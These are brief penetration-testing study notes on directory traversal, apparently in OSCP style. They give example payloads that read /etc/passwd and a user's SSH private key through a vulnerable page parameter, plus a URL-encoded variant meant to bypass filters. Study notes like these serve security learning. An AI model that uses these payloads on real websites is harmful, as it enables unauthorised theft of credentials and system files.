Directory traversal allows you to get to a file to read.

You can possibly use ../ to use relative paths to get to where you want to.
cat ../../../../../../../../../../../etc/passwd

Similarly, there are misconfigured web-sites that one can use to get to wanted files:
http://website.com/somefolder/index.php?page=../../../../../../../../../etc/passwd

Such technique can be used to get critical files, such as ssh keys:
curl http://website.com/somefolder/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa

If there's filter preventing us from using special characters, you can use URL Encoding (using CyberChef or burp suite like tools):
curl http://website.com/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd